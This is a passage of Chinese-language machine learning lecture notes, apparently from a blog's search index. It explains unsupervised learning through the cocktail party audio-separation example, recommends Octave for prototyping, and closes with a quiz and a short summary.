在这种情况下你很难听清楚你面前的人说的话</li><li>因此 比如有这样一个场景 宴会上只有两个人 两个人 同时说话 恩 这是个很小的鸡尾酒宴会 我们准备好了两个麦克风 把它们放在房间里 然后 因为这两个麦克风距离这两个人 的距离是不同的 每个麦克风都记录下了 来自两个人的声音的不同组合</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526486053_1219325593_1539943187" alt="_1526486053_1219325593_1539943187_1526486053_1219325593.png"></p><ul><li>也许A的声音 在第一个麦克风里的声音会响一点 也许B的声音 在第二个麦克风里会比较响一些 因为2个麦克风 的位置相对于 2个说话者的位置是不同的 但每个麦克风都会录到 来自两个说话者的重叠部分的声音</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526486064_1893704755_1539943199" alt="_1526486064_1893704755_1539943199_1526486064_1893704755.png"></p><ul><li>一个研究员录下的两个说话者的声音,<strong>无监督学习算法可以将两种混合在一起的音频分开</strong></li><li>所以,你可以看到,像这样的无监督学习算法,看起来 为了 构建这个应用程序 做这个音频处理 似乎需要写好多代码啊 或者需要链接到 一堆处理音频的Java库 貌似需要一个非常复杂的程序,分离出音频等 </li><li>实际上,要实现混合音频分离的效果,只需要一行代码就可以了</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526486082_1327522151_1539943212" alt="_1526486082_1327522151_1539943212_1526486082_1327522151.png"></p><ul><li>当然 研究人员 花了很长时间才想出这行代码的,我不是说这是一个简单的问题 但事实上 如果你 使用正确的编程环境 许多学习 算法是用很短的代码写出来的 </li><li>所以这也是为什么在 这门课中我们要 使用<strong>Octave</strong>的编程环境 </li><li>Octave是一个免费的 开放源码的软件 使用Octave或Matlab这类的工具 许多学习算法 都可以用几行代码就可以实现 在后续课程中 我会教你如何使用Octave 你会学到 如何在Octave中实现这些算法 或者 如果你有Matlab 你可以用它 事实上 在硅谷 很多的机器学习算法 我们都是先用Octave 写一个程序原型 因为在Octave中实现这些 学习算法的速度快得让你无法想象 </li><li>在这里 每一个函数 例如 SVD 意思是奇异值分解 但这其实是解线性方程 的一个惯例 它被内置在Octave软件中了 </li><li>如果你试图 在C + +或Java中做这个 将需要写N多代码 并且还要连接复杂的C + +或Java库 所以 你可以在C++或 Java或Python中 实现这个算法 只是会 更加复杂而已 </li><li>如果你使用Octave的话 会学的更快 并且如果你用 Octave作为你的学习工具 和开发原型的工具 你的学习和开发过程 会变得更快 </li><li>而事实上在硅谷 很多人会这样做 他们会先用Octave 来实现这样一个学习算法原型 只有在确定 这个算法可以工作后 才开始迁移到 C++ Java或其它编译环境 事实证明 这样做 实现的算法 比你一开始就用C++ 实现的算法要快多了 </li><li>我们谈到了无监督学习 它是一种学习机制 你给算法大量的数据 要求它找出数据中 蕴含的类型结构 以下的四个例子中 哪一个 您认为是 无监督学习算法 而不是监督学习问题</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526486136_2099457706_1539943241" alt="_1526486136_2099457706_1539943241_1526486136_2099457706.png"></p><pre><code>* 恩 没忘记垃圾邮件文件夹问题吧？ 如果你已经标记过数据 那么就有垃圾邮件和 非垃圾邮件的区别 我们会将此视为一个监督学习问题* 新闻故事的例子 正是我们在本课中讲到的 谷歌新闻的例子 我们介绍了你可以如何使用 聚类算法这些文章聚合在一起 所以这是无监督学习问题* 市场细分的例子 我之前有说过 这也是一个无监督学习问题 因为我是要 拿到数据 然后要求 它自动发现细分市场 * 最后一个例子 糖尿病 这实际上就像我们 上节课讲到的乳腺癌的例子 只不过这里不是 好的或坏的癌细胞 良性或恶性肿瘤我们 现在是有糖尿病或 没有糖尿病 所以这是 有监督的学习问题 像处理那个乳腺癌的问题一样 我们会把它作为一个 有监督的学习问题来处理</code></pre><h3 id="小小的总结-1"><a href="#小小的总结-1" class="headerlink" title="小小的总结"></a>小小的总结</h3><ul><li>无监督的学习使我们能够很少或根本不知道我们的结果应该是什么样子。 我们可以从数据中推导出结构，我们不一定知道变量的影响。</li><li>我们可以通过基于数据中变量之间的关系对数据进行聚类来推导出这种结构。</li><li>在无监督学习的基础上，没有基于预测结果的反馈。</li><li>例：<ul><li><code>聚类(Clustering)</code>：搜集一百万个不同的基因，并找到一种方法，将这些基因自动分组，这些基因组通过不同的变量（例如寿命，位置，角色等）相似或相关。</li><li><code>非聚类(Non-clustering)</code>：“鸡尾酒会算法”，可以让你在混乱的环境中找到结构。 （即在鸡尾酒会上从声音网格中识别个别的声音和音乐）。</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 机器学习 </category>
          
          <category> 机器学习入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 机器学习简介 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
